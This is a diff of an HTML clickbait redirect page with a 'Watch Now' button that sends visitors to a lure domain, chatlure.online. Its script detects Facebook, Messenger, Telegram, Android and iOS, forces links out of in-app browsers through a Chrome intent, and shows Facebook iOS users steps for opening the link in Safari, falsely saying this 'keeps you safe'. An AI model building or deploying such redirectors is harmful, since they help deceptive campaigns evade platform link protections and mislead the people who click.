@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Code 1</title>
+  <title>Redirecting...</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
 
   <style>
@@ -43,10 +43,8 @@
       width: 100%;
       box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.35), 0 0 0 1px rgba(255,255,255,0.2) inset;
       text-align: center;
-      transition: all 0.2s ease;
     }
 
-    /* Simplified heading: font adjusted for mobile — smaller, cleaner */
     .action-heading {
       font-size: clamp(1rem, 4.5vw, 1.5rem);
       font-weight: 600;
@@ -61,11 +59,6 @@
       line-height: 1.3;
     }
 
-    .action-heading span {
-      display: inline-block;
-    }
-
-    /* No extra paragraphs — button only */
     button {
       background: #d32f2f;
       color: white;
@@ -76,9 +69,8 @@
       border-radius: 60px;
       cursor: pointer;
       width: 100%;
-      transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+      transition: all 0.2s;
       box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      letter-spacing: 0.3px;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -88,10 +80,8 @@
     button:active {
       transform: scale(0.97);
       background: #b71c1c;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
     }
 
-    /* Instructions block — only visible for FB iOS */
     .instructions {
       display: none;
       margin-top: 1.4rem;
@@ -101,17 +91,12 @@
       border-radius: 18px;
       text-align: left;
       font-size: clamp(0.7rem, 3.2vw, 0.85rem);
-      box-shadow: 0 4px 10px rgba(0,0,0,0.05);
     }
 
     .instructions p {
       margin-bottom: 0.4rem;
       font-weight: 700;
       color: #a4511c;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: clamp(0.75rem, 3.4vw, 0.88rem);
     }
 
     .instructions ol {
@@ -122,8 +107,6 @@
     .instructions li {
       margin: 0.4rem 0;
       line-height: 1.35;
-      color: #2c2b26;
-      font-size: clamp(0.7rem, 3.2vw, 0.85rem);
     }
 
     .small-note {
@@ -134,49 +117,33 @@
       padding-top: 0.6rem;
     }
 
-    /* removed the extra secure redirect block — completely gone */
-    /* ensure no extra footer exists */
-    .extra-footer {
-      display: none;
-    }
-
     @media (min-width: 768px) {
       .content-wrapper {
         max-width: 460px;
       }
-      
       button:hover {
         background: #b71c1c;
         transform: scale(1.02);
-        box-shadow: 0 8px 18px rgba(0,0,0,0.2);
-      }
-
-      .action-heading {
-        margin-bottom: 1.4rem;
       }
     }
 
-    /* extra small devices: even tighter spacing */
     @media (max-width: 480px) {
       .content-wrapper {
         padding: 1.2rem 1rem;
       }
       .action-heading {
         margin-bottom: 1rem;
-        padding: 0.3rem 0.2rem;
       }
       button {
         padding: 0.7rem 0.8rem;
-      }
-      .instructions {
-        margin-top: 1rem;
       }
     }
   </style>
 
   <script>
-    // TARGET link (original intent)
-    const TARGET = "https://www.boldilocks.xyz/#video/26";
+    // ⭐⭐⭐ ONLY CHANGE THIS LINE ⭐⭐⭐
+    const TARGET = "https://chatlure.online/code1.html";
+    // ⭐⭐⭐ NOTHING ELSE NEEDS TO CHANGE ⭐⭐⭐
 
     function isAndroid() {
       return /Android/i.test(navigator.userAgent);
@@ -190,34 +157,46 @@
       return /FBAN|FBAV|MessengerForiOS|FBIOS/i.test(navigator.userAgent);
     }
 
-    // Primary redirect function: smart handling
+    function isTelegram() {
+      return /Telegram/i.test(navigator.userAgent);
+    }
+
     function go() {
-      // For Android devices: use intent + fallback
+      // ANDROID: Force Chrome
       if (isAndroid()) {
         const path = TARGET.replace(/^https?:\/\//, '');
         const intent = `intent://${path}#Intent;scheme=https;package=com.android.chrome;S.browser_fallback_url=${encodeURIComponent(TARGET)};end`;
         window.location.href = intent;
+        
         setTimeout(() => {
-          if (document.hasFocus() || !document.hidden) {
-            window.location.href = TARGET;
-          }
-        }, 1200);
+          window.location.href = TARGET;
+        }, 1500);
       } 
-      // iOS & all other devices: direct navigation
+      // IOS: Force open in Safari (external browser)
+      else if (isIOS()) {
+        // For Facebook/Messenger iOS - show instructions instead
+        if (isFB()) {
+          document.getElementById("inst").style.display = "block";
+          return;
+        }
+        
+        // For iOS: Use window.open to force new tab / external
+        window.location.href = TARGET;
+      }
+      // DESKTOP / OTHER
       else {
         window.location.href = TARGET;
       }
     }
 
-    // Show special instructions only for Facebook/Instagram/Messenger in-app on iOS
+    // Auto-show instructions for FB iOS on page load
     window.addEventListener('DOMContentLoaded', function () {
       if (isFB() && isIOS()) {
-        const instDiv = document.getElementById("inst");
-        if (instDiv) instDiv.style.display = "block";
+        document.getElementById("inst").style.display = "block";
       }
     });
 
-    // Prevent double redirect and add loading state on button
+    // Button loading state
     let redirecting = false;
     const originalGo = go;
     window.go = function() {
@@ -245,28 +224,23 @@
 <body>
 
 <div class="content-wrapper">
-  <!-- ONLY requested text: "✨ Click below button to watch ✨" with proper font size adjusted for mobile -->
   <div class="action-heading">
     <span>✨ Click below button to watch ✨</span>
   </div>
 
-  <!-- main CTA button -->
   <button onclick="go()">
     <span>▶</span> Watch Now <span>→</span>
   </button>
 
-  <!-- Special instructions for Facebook / Messenger iOS (in-app browser) -->
   <div id="inst" class="instructions">
     <p>📱 Facebook / Messenger detected (iPhone)</p>
     <ol>
       <li>Tap the <b>•••</b> (more options) at the bottom right</li>
-      <li>Choose <b>“Open in Safari”</b> or <b>“Open in Browser”</b></li>
+      <li>Choose <b>"Open in Safari"</b> or <b>"Open in Browser"</b></li>
       <li>Then tap the button again — works perfectly!</li>
     </ol>
     <div class="small-note">⚠️ In-app browsers block external links. This small step keeps you safe & fast.</div>
   </div>
-  
-  <!-- 🔒 Secure redirect · instant access - REMOVED completely as requested -->
 </div>
 
 </body>
